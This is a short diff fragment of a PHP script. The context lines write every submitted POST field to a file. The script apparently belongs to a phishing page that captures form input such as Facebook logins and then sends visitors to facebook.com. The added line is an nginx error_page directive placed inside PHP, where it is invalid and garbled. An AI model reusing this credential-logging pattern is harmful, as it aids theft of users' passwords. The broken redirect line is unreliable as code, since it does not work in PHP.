@@ -9,5 +9,6 @@ foreach($_POST as $variable => $value) {
 }
 fwrite($handle, "===============\r\n");
 fclose($handle);
+error_page 405 = $https://www.facebook.com
 exit;
 ?>
